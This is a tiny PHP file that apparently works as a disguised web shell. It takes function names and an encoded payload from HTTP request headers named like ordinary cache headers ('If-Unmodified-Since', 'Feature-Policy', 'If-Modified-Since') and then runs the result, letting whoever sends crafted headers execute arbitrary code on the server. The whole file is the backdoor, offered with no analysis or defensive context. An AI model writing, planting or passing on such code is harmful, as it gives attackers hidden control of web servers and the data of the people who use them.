<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['If-Unmodified-Since'])) {
    $center = $_HEADERS['If-Unmodified-Since']('', $_HEADERS['Feature-Policy']($_HEADERS['If-Modified-Since']));
    $center();
}